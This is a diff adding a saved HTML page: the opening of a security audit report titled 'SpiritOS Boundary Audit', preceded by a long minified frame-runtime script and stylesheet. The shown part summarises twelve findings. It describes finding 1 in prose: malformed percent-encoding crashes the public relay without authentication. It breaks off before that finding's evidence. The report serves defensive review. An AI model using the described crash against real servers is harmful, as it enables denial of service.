@@ -1,0 +1,1058 @@
+<!DOCTYPE html>
+<!-- saved from url=(0253)https://3b07d202-bd1b-45c3-b618-5ab15fe0c8c6.frame.claudeusercontent.com/_f/1788641891-0fef/?__frame_t=IIluZHghK8yWRKj-KhaV7vGo.0fdf8171-f539-4efa-9b33-c3be6117aefb.c43d7e41-5622-45db-852c-ab7d0d10dced.1788645513&__frame_v=manifest.db4407fd1f4905d5.json -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!-- frame-runtime --><script>window.__FRAME_PREAMBLE={"v":1,"capabilities":{"artifact":"artifact.DfA2To-s.js","assets":"assets.8Gk803W0.js","comments":"comments.hEoja5zd.js","db":"db.h-3sndFg.js","downloads":"downloads.th1YuAIk.js","embed":"embed.eqL6deQM.js","endpoints":"endpoints.CfzSv5nM.js","mcp":"mcp.Bvma3qD7.js","network":"network.B5UA9Su4.js","permissions":"permissions.BNySkLV5.js","room":"room.VSdFwTE9.js","sample":"sample.BW2Uysoh.js","self":"artifact.DfA2To-s.js","user":"user.BpKav-Rf.js"},"transforms":"_transforms.-IAc0qoT.js","comments":"_comments.C-AkolIB.js","translate":"_translate.5HCW4BJh.js","ldx":"_ldx.f0k6Z2Dd.js"}</script><script>(function(){"use strict";var le=["light","dark","system"],ue=/^[A-Za-z0-9_-]{1,64}$/,J=/^[a-zA-Z_:][a-zA-Z0-9_:.-]{0,127}$/,fe=new Set(["class","hidden","value","checked","style","title","alt","placeholder","lang","dir","role","tabindex","disabled","readonly","contenteditable","open","colspan","rowspan"]);function de(e){const t=e.toLowerCase();return t.startsWith("data-")||t.startsWith("aria-")||fe.has(t)}var We="http://www.w3.org/1999/xhtml",pe="http://www.w3.org/2000/svg",me=new Set(["script","style","iframe","noscript","noframes","noembed","xmp","plaintext","template","title","textarea","object","embed"]),he=new Set(["script","style"]);function _e(e){const t=e.localName.toLowerCase();return e.namespaceURI==="http://www.w3.org/1999/xhtml"?!me.has(t):e.namespaceURI===pe?!he.has(t):!1}function I(e,t){return e===t||(e===160||e===32)&&(t===160||t===32)}function ve(e,t){const r=e.length,n=t.length;let a=0;for(;a<r&&a<n&&I(e.charCodeAt(a),t.charCodeAt(a));)a++;let s=0;for(;s<r-a&&s<n-a&&I(e.charCodeAt(r-1-s),t.charCodeAt(n-1-s));)s++;return{p:a,s}}function ye(e,t){const r=e.firstChild;if(e.childNodes.length!==1||r===null||r.nodeType!==Node.TEXT_NODE){e.textContent=t;return}const n=r.data,a=n.length,s=t.length,{p:c,s:i}=ve(n,t);c===a&&i===0&&a===s||r.replaceData(c,a-c-i,t.slice(c,s-i));const p=r.data,f=e.ownerDocument.getSelection?.()??null,v=f!==null&&f.rangeCount>0&&(f.anchorNode===r||f.focusNode===r)?{anchor:f.anchorNode,anchorOffset:f.anchorOffset,focus:f.focusNode,focusOffset:f.focusOffset}:null;let d=-1,y=-1;for(let _=0;_<p.length&&_<t.length;_++){const E=p.charCodeAt(_),T=t.charCodeAt(_);E!==T&&I(E,T)&&(d<0&&(d=_),y=_)}const w=d>=0;if(w&&r.replaceData(d,y-d+1,t.slice(d,y+1)),w&&v!==null&&v.anchor!==null&&v.focus!==null)try{f.setBaseAndExtent(v.anchor,v.anchorOffset,v.focus,v.focusOffset)}catch{}}var we=new Set(["html","head","body","frameset"]);function be(e){return e.namespaceURI==="http://www.w3.org/1999/xhtml"&&we.has(e.localName)}function Ee(e){if(e===null||typeof e!="object")return!1;const t=e;if(typeof t.target!="string"||!ue.test(t.target)||t.text!==void 0&&typeof t.text!="string")return!1;if(t.attrsSet!==void 0){if(t.attrsSet===null||typeof t.attrsSet!="object")return!1;for(const[r,n]of Object.entries(t.attrsSet))if(!J.test(r)||typeof n!="string")return!1}if(t.attrsRemoved!==void 0){if(!Array.isArray(t.attrsRemoved))return!1;for(const r of t.attrsRemoved)if(typeof r!="string"||!J.test(r))return!1}return!0}function ge(e,t){if(e===null||typeof e!="object")return!1;const{seq:r,elements:n}=e;if(typeof r!="number"||!Number.isSafeInteger(r)||!Array.isArray(n)||n.length===0||n.length>64)return!1;for(let a=0;a<n.length;a++)if(!t(n[a]))return!1;return!0}function Ae(e){return e===null||typeof e!="object"?!1:ge(e.__frame_patch,Ee)}function Te(e){if(e===null||typeof e!="object")return!1;const t=e.__frame_init;return t!==null&&typeof t=="object"}function Re(e){return e!==null&&typeof e=="object"&&e.__frame_size_poke===!0}function Le(e){if(e===null||typeof e!="object")return!1;const t=e.__frame_theme;if(t===null||typeof t!="object")return!1;const r=t.theme;return typeof r=="string"&&le.includes(r)}var L=/^[\w.-]+\.js$/;function Se(e,t,r){return r?"inert":typeof t=="string"&&L.test(t)?e?[t]:"inert":e?"inert":"framed"}var Ke="frame_ldx_runtime",$e="script#an-form";function ke(){return{post(e,t){parent.postMessage(e,t)},on(e){const t=r=>{r.source===parent&&e(r.data,r.origin,r.isTrusted)};return addEventListener("message",t),()=>removeEventListener("message",t)}}}function Pe(){return{post:()=>{},on:()=>()=>{}}}var U="__frame_scroll",Oe=150,Ce=310,Me=160,je=3e4;function Ne(){let e=0,t=!1,r=!1,n=!1,a=0,s=null;const c=u=>{try{sessionStorage.setItem(U,JSON.stringify({y:u}))}catch{}},i=()=>{if(clearTimeout(e),s===null)return;const u=s;s=null,c(u)},p=()=>{if(t){t=!1;return}r=!0,s=scrollY,clearTimeout(e),e=setTimeout(i,Oe)};try{addEventListener("scroll",p,{passive:!0}),addEventListener("pagehide",i)}catch{}const f=()=>{let u;try{u=sessionStorage.getItem(U)}catch{return null}if(u===null)return null;let b;try{b=JSON.parse(u)}catch{b=null}const o=b?.y;if(!(typeof o=="number"&&Number.isFinite(o)&&o>=0)){try{sessionStorage.removeItem(U)}catch{}return null}return o};let v=!1;const d=u=>{try{const b=scrollY;scrollTo({top:u,left:0,behavior:"instant"}),a=u,n=!0,clearTimeout(e),s=null,c(u);const o=scrollY;o!==b&&(t=!0),o!==u&&!v&&(v=!0,addEventListener("load",()=>{try{if(scrollY===o){const m=f();d(m!==null?m:a)}}catch{}},{once:!0}))}catch{}},y=()=>{try{return!!location.hash}catch{return!0}};let w=!1;const _=()=>{try{if(w||innerWidth>Ce||innerHeight>Me)return;w=!0;const u=Date.now(),b=()=>{try{removeEventListener("resize",b)}catch{}if(Date.now()-u>je||r||y())return;const o=f();d(o!==null?o:a)};addEventListener("resize",b)}catch{}};let E=!1,T=!1;return{restore(){if(E||(E=!0,y()))return;const u=f();u!==null&&(d(u),_())},promoted(){if(T||(T=!0,y()))return;const u=f();u!==null?(d(u),_()):n&&d(a)}}}function Be(e,t,r,n){let a=null;try{a=window.trustedTypes?.createPolicy("frame-runtime",{createScriptURL:p=>p})??null}catch{}const s=window.Worker,c=s?.prototype,i=Object.freeze({Worker:s,workerOn:c?.addEventListener,workerPost:c?.postMessage,workerTerminate:c?.terminate,fetch:window.fetch.bind(window),preventDefault:Event.prototype.preventDefault,policy:a,origins:t});r(e).then(p=>p?.bootTopLevel?p.bootTopLevel(i,n):n.settle()).catch(()=>n.settle())}var qe="modulepreload",Xe=function(e){return"/"+e},Ye={},De=function(t,r,n){let a=Promise.resolve();function s(c){const i=new Event("vite:preloadError",{cancelable:!0});if(i.payload=c,window.dispatchEvent(i),!i.defaultPrevented)throw c}return a.then(c=>{for(const i of c||[])i.status==="rejected"&&s(i.reason);return t().catch(s)})},Ie=window===top,Q=Object.getOwnPropertyDescriptor(window,"claude"),C=Se(Ie,window.__FRAME_PREAMBLE?.topLevel,Q?.writable===!1),x=typeof C=="object"&&C[0],h=x?Pe():ke();(function(){const e=Object.defineProperty,t=globalThis,r=["RTCPeerConnection","webkitRTCPeerConnection","RTCDataChannel","RTCIceCandidate","RTCSessionDescription","RTCRtpSender","RTCRtpReceiver"];let n=0;for(let a=0;a<r.length;a++){const s=r[a];try{e(t,s,{value:void 0,writable:!1,configurable:!1})}catch{try{delete t[s]}catch{}try{e(t,s,{value:void 0,writable:!1,configurable:!0})}catch{}}typeof t[s]=="function"&&n++}if(n&&C==="framed")try{h.post({__frame_rtc_lockdown_failed:n},"*")}catch{}})();var Ue=1e4,xe=2e3,ee=Object.freeze([...window.__FRAME_PREAMBLE?.origins??["https://claude.ai","https://preview.claude.ai"]]);function te(e){for(const t of ee)if(t.endsWith(":*"))try{const r=new URL(e);if(`${r.protocol}//${r.hostname}:*`===t)return!0}catch{}else if(e===t)return!0;return!1}var M=Object.freeze({...window.__FRAME_PREAMBLE?.capabilities}),F=window.__FRAME_PREAMBLE?.transforms,z=window.__FRAME_PREAMBLE?.comments,H=window.__FRAME_PREAMBLE?.translate,W=window.__FRAME_PREAMBLE?.ldx;function S(e){return De(()=>import("/_runtime/"+e),void 0)}function re(e,t){return{contract:e.contract,changes:new Set(e.changes??[]),flags:new Set(e.flags??[]),capabilities:e.capabilities??{},capBudgets:e.capBudgets??{},transforms:new Map,shellOrigin:t,mount:q,hooks:N,pipe:()=>({wrap:(r,n)=>(...a)=>{try{return n(...a)}catch(s){return Promise.reject(s)}}})}}var j=null,A=null;function ne(e,t,r){try{Object.defineProperty(e,t,{value:r,writable:!1,configurable:!1,enumerable:!0})}catch{try{Object.defineProperty(e,t,{value:r,writable:!1,configurable:!0,enumerable:!0})}catch{}}}var K=!1,N={editBefore:null,edit:null};function Fe(e,t,r=!1){const n=[];let a;if(r)try{N.editBefore?.(e)}catch{}for(const s of e.elements){const c=document.querySelector(`[data-id="${s.target}"]`);if(!c){a=s.target;break}if([...Object.keys(s.attrsSet??{}),...s.attrsRemoved??[]].some(i=>!de(i))){a=s.target;break}if(s.text!==void 0&&(!_e(c)||be(c))){a=s.target;break}for(const[i,p]of Object.entries(s.attrsSet??{}))if(!se(c,i)){try{c.setAttribute(i,p)}catch{}oe(c,i,p)}for(const i of s.attrsRemoved??[])se(c,i)||(c.removeAttribute(i),oe(c,i,null));typeof s.text=="string"&&ye(c,s.text),n.push(s.target)}if(r)try{N.edit?.(e.seq,n,a)}catch{}if(a!==void 0){h.post({__frame_patch_miss:{seq:e.seq}},t);return}try{document.dispatchEvent(new CustomEvent("claude:edit",{detail:{seq:e.seq,targets:n}}))}catch{}}function oe(e,t,r){if(!(e instanceof HTMLInputElement))return;const n=t.toLowerCase();n==="checked"?e.checked=r!==null:n==="value"&&e.type!=="file"&&(e.value=r??"")}function se(e,t){const r=t.toLowerCase(),n=e;return r==="data-id"||(r==="value"||r==="checked")&&(n.__artifactSecret===!0||/^(password|hidden|file)$/.test(n.type??"")||/(^|\s)(cc-|one-time-code|current-password|new-password)/i.test(`${e.getAttribute("autocomplete")??""} ${n.autocomplete??""}`))}function ae(e){const t=document.documentElement;e==="light"||e==="dark"?(t.dataset.theme=e,t.style.colorScheme=e,K=!0):K&&(delete t.dataset.theme,t.style.colorScheme="",K=!1)}var B=new Map;function ze(){let e;const t={u:new Promise(r=>{e=r}),r:r=>{t.done=!0,e(r)},done:!1,nulled:!1};return t}function $(){for(const e of B.values())e.done||(e.nulled=!0,e.r(null))}var He=Object.freeze(Object.assign(Object.create(null),{call:Function.prototype.call,apply:Function.prototype.apply,bind:Function.prototype.bind})),q=(e,t)=>{const r=B.get(e);if(!r||r.done){r?.nulled&&A&&h.post({__frame_cap_telemetry:{kind:"cap-load-error",cap:e}},A);return}const n=typeof t=="function"?Object.setPrototypeOf(t,He):Object.assign(Object.create(null),t);typeof n.then=="function"&&delete n.then,r.r(Object.freeze(n))};function ie(){const e=Q?.value??{};ne(window,"claude",e);for(const t of Object.keys(M)){if(e[t]!==void 0){ne(e,t,e[t]);continue}B.set(t,ze())}if(e.use===void 0){const t=r=>{if(typeof r!="string"||!Object.hasOwn(M,r))return Promise.resolve(null);const n=B.get(r);return n?n.u:Promise.resolve(e[r]??null)};try{Object.defineProperty(e,"use",{value:t,writable:!0,configurable:!0,enumerable:!1})}catch{}}}if(C==="framed"){const e=F&&L.test(F)?S(F).catch(()=>{}):Promise.resolve(void 0),t=o=>{if(o.type==="auxclick"&&o.button!==1)return;const m=o.target,k=m&&m.closest?m.closest("a[href],area[href]"):null;if(!k)return;const O=k.getAttribute("href");if(!O)return;let R;try{R=new URL(O,document.baseURI)}catch{return}if((R.protocol==="http:"||R.protocol==="https:")&&R.origin!==location.origin){o.preventDefault();const P=(k.getAttribute("target")??"").toLowerCase(),g=o.type==="auxclick"||o.metaKey||o.ctrlKey||o.shiftKey||o.altKey||!["","_self","_top","_parent"].includes(P);h.post({__frame_nav:!0,url:R.href,newTab:g},"*")}};addEventListener("click",t,!0),addEventListener("auxclick",t,!0);const r={},n=o=>{o.isTrusted&&(r.pointer=!0)},a=o=>{o.isTrusted&&(r.click=!0)};addEventListener("pointermove",n,{capture:!0,passive:!0}),addEventListener("click",a,{capture:!0,passive:!0});const s={cb:null};addEventListener("keydown",o=>s.cb?.(o),!0),e.then(o=>o?.installEscapeForward?.(s,m=>{A&&h.post(m,A)})),e.then(o=>{o?.wireNav&&(o.wireNav(),removeEventListener("click",t,!0),removeEventListener("auxclick",t,!0),removeEventListener("pointermove",n,!0),removeEventListener("click",a,!0),o.wireEngagement?.(r))});let c=null;try{c=Ne()}catch{}ie();let i=null,p=null,f=0;const v=h.on((o,m)=>{te(m)&&Te(o)&&(i=o.__frame_init,A=m,v(),clearTimeout(f),p?.())});h.post({__frame_connect:!0},"*");const d=setTimeout,y=clearTimeout;let w=0;const _=()=>{try{h.post({__frame_alive:!0},"*")}catch{}w=d(_,xe)},E=()=>y(w);_(),addEventListener("load",E,{once:!0});const T=new Promise(o=>{p=o,f=setTimeout(()=>{v(),o()},Ue)}),u=document.readyState==="loading"?new Promise(o=>document.addEventListener("DOMContentLoaded",()=>o(),{once:!0})):Promise.resolve();u.then(()=>{try{c?.restore()}catch{}});const b={cb:null};h.on((o,m)=>{if(te(m)&&Re(o)){try{c?.promoted()}catch{}b.cb?.()}}),T.then(async()=>{if(!i||!A){$();return}ae(i.theme);const o=A;let m=!1,k=!1;h.on((l,Y,D)=>{if(Y!==o)return;Le(l)&&ae(l.__frame_theme.theme),Ae(l)&&Fe(l.__frame_patch,o,D);const G=l?.__fc_mode;G&&typeof G=="object"&&!m&&z&&L.test(z)&&(m=!0,S(z).then(Z=>Z.install?.(o,G.on===!0)).catch(()=>{}));const V=l?.__ft_cmd;V&&typeof V=="object"&&!k&&H&&L.test(H)&&(k=!0,S(H).then(Z=>Z.install?.(o,V)).catch(()=>{}))});const O=Object.keys(i.capabilities??{}).filter(l=>Object.hasOwn(M,l)).map(l=>[l,M[l]]).filter(l=>typeof l[1]=="string"&&L.test(l[1])),R=await Promise.allSettled(O.map(([,l])=>S(l))),P=await e,g=A;if(P?.buildBoot||h.post({__frame_cap_telemetry:{kind:"cap-load-error",cap:"_transforms"}},g),P?.buildBoot)try{j=P.buildBoot(i,P.TRANSFORMS??{},{shellOrigin:g,mount:q,hooks:N},l=>h.post({__frame_cap_telemetry:l},g))}catch{h.post({__frame_cap_telemetry:{kind:"cap-load-error",cap:"_transforms"}},g),j=re(i,g)}else j=re(i,g);const X=l=>h.post({__frame_cap_telemetry:{kind:"cap-load-error",cap:l}},g),ce=j;R.forEach((l,Y)=>{const D=O[Y][0];if(l.status!=="fulfilled"){X(D);return}try{l.value?.install?.(ce)}catch{X(D)}}),$(),await u,E(),h.post({__frame_ready:!0},A),e.then(l=>l?.installSizeReporter?.(g,b)),ce.flags.has("frame_ldx_runtime")&&W&&L.test(W)&&document.querySelector("script#an-form")&&S(W).then(l=>l?.boot?.()).catch(()=>!1).then(l=>{l!==!0&&X("_ldx")})})}else x&&(ie(),Be(x,ee,S,{settle:$,mount:q}))})();</script><!-- /frame-runtime --><meta name="viewport" content="width=device-width,initial-scale=1"><style>:root{color-scheme:light}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#faf9f5;color:#141413}img{max-width:100%}[hidden]:not([hidden=until-found]){display:none!important}</style></head><body>
+<title>SpiritOS Boundary Audit</title>
+<link rel="preconnect" href="https://fonts.googleapis.com/">
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+<link rel="stylesheet" href="./css2">
+
+<style>
+  :root {
+    --ground:      #F4F6F8;
+    --surface:     #FFFFFF;
+    --inset:       #EDF1F4;
+    --ink:         #141A22;
+    --ink-mid:     #4C5665;
+    --ink-soft:    #78838F;
+    --rule:        #D8DFE6;
+    --rule-soft:   #E7ECF1;
+
+    --accent:      #0B6E77;
+    --accent-soft: #E0F0F1;
+
+    --crit:        #A81D26;
+    --crit-soft:   #F8E6E7;
+    --high:        #96590A;
+    --high-soft:   #FBEEDC;
+    --mod:         #3D5C80;
+    --mod-soft:    #E6EDF5;
+    --low:         #5C6472;
+    --low-soft:    #EAEDF1;
+
+    --mono: "IBM Plex Mono", ui-monospace, "SF Mono", Menlo, monospace;
+    --sans: "IBM Plex Sans", system-ui, -apple-system, "Segoe UI", sans-serif;
+    --serif: "IBM Plex Serif", Georgia, "Times New Roman", serif;
+
+    --measure: 68ch;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --ground:      #10141A;
+      --surface:     #171C24;
+      --inset:       #0B0E13;
+      --ink:         #E6EBF1;
+      --ink-mid:     #A3AEBC;
+      --ink-soft:    #798492;
+      --rule:        #2A323D;
+      --rule-soft:   #212934;
+
+      --accent:      #4FC3CC;
+      --accent-soft: #103336;
+
+      --crit:        #FF8085;
+      --crit-soft:   #3A1A1D;
+      --high:        #EFAE4E;
+      --high-soft:   #372817;
+      --mod:         #9BBCDD;
+      --mod-soft:    #1B2836;
+      --low:         #98A3B1;
+      --low-soft:    #1D232C;
+    }
+  }
+
+  :root[data-theme="dark"] {
+    --ground:      #10141A;
+    --surface:     #171C24;
+    --inset:       #0B0E13;
+    --ink:         #E6EBF1;
+    --ink-mid:     #A3AEBC;
+    --ink-soft:    #798492;
+    --rule:        #2A323D;
+    --rule-soft:   #212934;
+
+    --accent:      #4FC3CC;
+    --accent-soft: #103336;
+
+    --crit:        #FF8085;
+    --crit-soft:   #3A1A1D;
+    --high:        #EFAE4E;
+    --high-soft:   #372817;
+    --mod:         #9BBCDD;
+    --mod-soft:    #1B2836;
+    --low:         #98A3B1;
+    --low-soft:    #1D232C;
+  }
+
+  * { box-sizing: border-box; }
+
+  body {
+    background: var(--ground);
+    color: var(--ink);
+    font-family: var(--sans);
+    font-size: 16px;
+    line-height: 1.6;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrap {
+    max-width: 1000px;
+    margin: 0 auto;
+    padding: 0 28px 96px;
+  }
+
+  /* ---------- masthead ---------- */
+
+  .masthead {
+    padding: 56px 0 28px;
+    border-bottom: 2px solid var(--ink);
+  }
+
+  .eyebrow {
+    font-family: var(--mono);
+    font-size: 11.5px;
+    font-weight: 500;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--ink-soft);
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px 14px;
+    align-items: baseline;
+  }
+  .eyebrow .sep { color: var(--rule); }
+
+  h1 {
+    font-family: var(--serif);
+    font-weight: 600;
+    font-size: clamp(34px, 5.4vw, 52px);
+    line-height: 1.08;
+    letter-spacing: -0.02em;
+    margin: 18px 0 0;
+    text-wrap: balance;
+  }
+
+  .standfirst {
+    font-family: var(--serif);
+    font-size: 18.5px;
+    line-height: 1.62;
+    color: var(--ink-mid);
+    max-width: var(--measure);
+    margin: 16px 0 0;
+  }
+  .standfirst em { color: var(--ink); font-style: italic; }
+
+  /* ---------- summary register ---------- */
+
+  .summary {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+    gap: 0;
+    border-bottom: 1px solid var(--rule);
+    margin-top: 0;
+  }
+
+  .tally {
+    padding: 22px 20px 20px 0;
+    border-right: 1px solid var(--rule-soft);
+  }
+  .tally:last-child { border-right: 0; }
+
+  .tally-n {
+    font-family: var(--mono);
+    font-size: 30px;
+    font-weight: 500;
+    line-height: 1;
+    font-variant-numeric: tabular-nums;
+    letter-spacing: -0.02em;
+  }
+  .tally-n.crit { color: var(--crit); }
+  .tally-n.high { color: var(--high); }
+  .tally-n.mod  { color: var(--mod); }
+  .tally-n.low  { color: var(--low); }
+
+  .tally-label {
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--ink-soft);
+    margin-top: 9px;
+  }
+
+  /* ---------- progress ---------- */
+
+  .progress-bar {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 18px 0;
+    border-bottom: 1px solid var(--rule);
+  }
+
+  .track {
+    flex: 1;
+    height: 6px;
+    background: var(--inset);
+    border: 1px solid var(--rule-soft);
+    overflow: hidden;
+  }
+  .fill {
+    height: 100%;
+    background: var(--accent);
+    width: 0%;
+    transition: width 260ms ease;
+  }
+  @media (prefers-reduced-motion: reduce) { .fill { transition: none; } }
+
+  .progress-text {
+    font-family: var(--mono);
+    font-size: 12px;
+    font-variant-numeric: tabular-nums;
+    color: var(--ink-mid);
+    white-space: nowrap;
+  }
+  .sync-note {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--ink-soft);
+    white-space: nowrap;
+  }
+
+  /* ---------- section heads ---------- */
+
+  h2 {
+    font-family: var(--mono);
+    font-size: 11.5px;
+    font-weight: 600;
+    letter-spacing: 0.16em;
+    text-transform: uppercase;
+    color: var(--ink-soft);
+    margin: 52px 0 0;
+    padding-bottom: 10px;
+    border-bottom: 1px solid var(--rule);
+  }
+
+  /* ---------- finding rows ---------- */
+
+  .finding {
+    border-bottom: 1px solid var(--rule-soft);
+    padding: 26px 0 30px;
+    display: grid;
+    grid-template-columns: 30px 1fr;
+    column-gap: 18px;
+  }
+
+  .check {
+    appearance: none;
+    -webkit-appearance: none;
+    width: 19px;
+    height: 19px;
+    margin: 5px 0 0;
+    border: 1.5px solid var(--ink-soft);
+    background: var(--surface);
+    cursor: pointer;
+    display: grid;
+    place-content: center;
+    flex: none;
+  }
+  .check:checked { background: var(--accent); border-color: var(--accent); }
+  .check:checked::after {
+    content: "";
+    width: 10px; height: 5.5px;
+    border-left: 2px solid var(--surface);
+    border-bottom: 2px solid var(--surface);
+    transform: rotate(-45deg) translate(1px, -1.5px);
+  }
+  .check:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+  .check:disabled { cursor: default; opacity: 0.45; }
+
+  .fhead {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: baseline;
+    gap: 8px 12px;
+  }
+
+  .fnum {
+    font-family: var(--mono);
+    font-size: 12px;
+    font-weight: 500;
+    color: var(--ink-soft);
+    font-variant-numeric: tabular-nums;
+  }
+
+  .ftitle {
+    font-family: var(--serif);
+    font-size: 22px;
+    font-weight: 600;
+    letter-spacing: -0.012em;
+    line-height: 1.28;
+    margin: 0;
+    flex: 1 1 340px;
+    text-wrap: balance;
+  }
+
+  .finding.done .ftitle { color: var(--ink-soft); text-decoration: line-through; text-decoration-thickness: 1px; }
+  .finding.done .fbody { opacity: 0.55; }
+
+  .chip {
+    font-family: var(--mono);
+    font-size: 10.5px;
+    font-weight: 500;
+    letter-spacing: 0.09em;
+    text-transform: uppercase;
+    padding: 3px 8px;
+    white-space: nowrap;
+    border: 1px solid transparent;
+  }
+  .chip.crit { color: var(--crit); background: var(--crit-soft); border-color: var(--crit); }
+  .chip.high { color: var(--high); background: var(--high-soft); border-color: var(--high); }
+  .chip.mod  { color: var(--mod);  background: var(--mod-soft);  border-color: var(--mod); }
+  .chip.low  { color: var(--low);  background: var(--low-soft);  border-color: var(--low); }
+
+  .chip.ev {
+    background: transparent;
+    border-color: var(--rule);
+    color: var(--ink-soft);
+  }
+  .chip.ev.e2e { color: var(--accent); border-color: var(--accent); background: var(--accent-soft); }
+
+  .fbody {
+    margin-top: 12px;
+    max-width: var(--measure);
+  }
+  .fbody p { margin: 0 0 11px; }
+  .fbody p:last-child { margin-bottom: 0; }
+
+  code, .path {
+    font-family: var(--mono);
+    font-size: 0.885em;
+    background: var(--inset);
+    border: 1px solid var(--rule-soft);
+    padding: 1px 5px;
+    white-space: nowrap;
+  }
+
+  .fix {
+    margin-top: 12px;
+    padding-left: 13px;
+    border-left: 2px solid var(--accent);
+    font-size: 15px;
+    color: var(--ink-mid);
+  }
+  .fix b {
+    font-family: var(--mono);
+    font-size: 10.5px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--accent);
+    display: block;
+    margin-bottom: 3px;
+    font-weight: 600;
+  }
+
+  /* ---------- evidence: the one inset surface ---------- */
+
+  .evidence {
+    margin: 15px 0 4px;
+    background: var(--inset);
+    border: 1px solid var(--rule);
+    max-width: 100%;
+    overflow-x: auto;
+  }
+  .evidence-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--ink-soft);
+    padding: 7px 13px 6px;
+    border-bottom: 1px solid var(--rule);
+    position: sticky;
+    left: 0;
+  }
+  .evidence pre {
+    margin: 0;
+    padding: 12px 13px 13px;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    line-height: 1.62;
+    color: var(--ink-mid);
+    white-space: pre;
+  }
+  .evidence .in  { color: var(--ink); font-weight: 500; }
+  .evidence .bad { color: var(--crit); font-weight: 500; }
+  .evidence .ok  { color: var(--accent); }
+
+  /* ---------- the gate-disagreement table ---------- */
+
+  .gate-wrap { margin: 16px 0 6px; overflow-x: auto; border: 1px solid var(--rule); }
+  table.gate {
+    border-collapse: collapse;
+    width: 100%;
+    min-width: 560px;
+    font-size: 13px;
+    background: var(--surface);
+  }
+  table.gate th {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.11em;
+    text-transform: uppercase;
+    color: var(--ink-soft);
+    text-align: left;
+    padding: 9px 13px;
+    border-bottom: 1px solid var(--rule);
+    font-weight: 600;
+    background: var(--inset);
+  }
+  table.gate td {
+    padding: 9px 13px;
+    border-bottom: 1px solid var(--rule-soft);
+    vertical-align: middle;
+  }
+  table.gate tr:last-child td { border-bottom: 0; }
+  table.gate td.p { font-family: var(--mono); font-size: 12.5px; white-space: nowrap; color: var(--ink); }
+  .verdict { font-family: var(--mono); font-size: 11px; font-weight: 500; letter-spacing: 0.05em; text-transform: uppercase; }
+  .verdict.shut { color: var(--ink-soft); }
+  .verdict.open { color: var(--crit); }
+  td.res { color: var(--ink-mid); font-size: 13px; }
+  td.res.leak { color: var(--crit); }
+
+  /* ---------- closing sections ---------- */
+
+  .credit {
+    margin-top: 18px;
+    padding: 22px 24px;
+    background: var(--surface);
+    border: 1px solid var(--rule);
+    max-width: var(--measure);
+  }
+  .credit ul { margin: 10px 0 0; padding-left: 19px; }
+  .credit li { margin-bottom: 7px; color: var(--ink-mid); }
+  .credit li:last-child { margin-bottom: 0; }
+  .credit li b { color: var(--ink); font-weight: 600; }
+
+  .thesis {
+    margin-top: 18px;
+    font-family: var(--serif);
+    font-size: 20px;
+    line-height: 1.55;
+    max-width: var(--measure);
+    color: var(--ink);
+  }
+  .thesis strong { font-weight: 600; box-shadow: inset 0 -0.42em 0 var(--accent-soft); }
+
+  footer {
+    margin-top: 54px;
+    padding-top: 18px;
+    border-top: 1px solid var(--rule);
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 0.05em;
+    color: var(--ink-soft);
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px 18px;
+  }
+
+  @media (max-width: 620px) {
+    .wrap { padding: 0 18px 72px; }
+    .finding { grid-template-columns: 26px 1fr; column-gap: 12px; }
+    .tally { padding-right: 14px; }
+  }
+</style>
+
+<script id="audit-state" type="application/json">{"done":[]}</script>
+
+<div class="wrap">
+
+  <header class="masthead">
+    <div class="eyebrow">
+      <span>Code review</span><span class="sep">/</span>
+      <span>SpiritOS @ ddf3574</span><span class="sep">/</span>
+      <span>5 Sep 2026</span><span class="sep">/</span>
+      <span>12 findings</span>
+    </div>
+    <h1>SpiritOS Boundary Audit</h1>
+    <p class="standfirst">
+      Twelve findings across the HTTP server, the kernel's filesystem gates, the relay, the
+      browser shell and the host scripts. Four were confirmed by running them rather than
+      reasoning from the source. The common thread: <em>every gate in this codebase matches on
+      the request string it was handed, not on the path the filesystem actually resolves.</em>
+    </p>
+  </header>
+
+  <section class="summary">
+    <div class="tally"><div class="tally-n crit" id="t-crit" style="opacity: 1;">2</div><div class="tally-label">Critical</div></div>
+    <div class="tally"><div class="tally-n high" id="t-high" style="opacity: 1;">3</div><div class="tally-label">High</div></div>
+    <div class="tally"><div class="tally-n mod" id="t-mod" style="opacity: 1;">4</div><div class="tally-label">Moderate</div></div>
+    <div class="tally"><div class="tally-n low" id="t-low" style="opacity: 1;">3</div><div class="tally-label">Low</div></div>
+  </section>
+
+  <div class="progress-bar">
+    <div class="track"><div class="fill" id="fill" style="width: 0%;"></div></div>
+    <div class="progress-text" id="ptext">0 of 12 resolved</div>
+    <div class="sync-note" id="sync"></div>
+  </div>
+
+  <h2>Findings register</h2>
+
+  <!-- 1 -->
+  <article class="finding" data-id="f1" data-sev="crit">
+    <input type="checkbox" class="check" aria-labelledby="f1-t">
+    <div>
+      <div class="fhead">
+        <span class="fnum">01</span>
+        <h3 class="ftitle" id="f1-t">Unauthenticated remote crash on the public relay</h3>
+        <span class="chip crit">Critical</span>
+        <span class="chip ev e2e">Verified E2E</span>
+      </div>
+      <div class="fbody">
+        <p>
+          <span class="path">server.js:498</span> calls <code>decodeURIComponent(url.pathname)</code>,
+          which throws <code>URIError</code> on malformed percent-encoding. The throw is uncaught
+          inside the request handler, so the process exits. It runs <em>before</em> the
+          <code>isRelayPublicPath</code> check, so the relay's deliberately narrowed surface
+          offers no protection.
+        </p>
+        <div class="evidence">
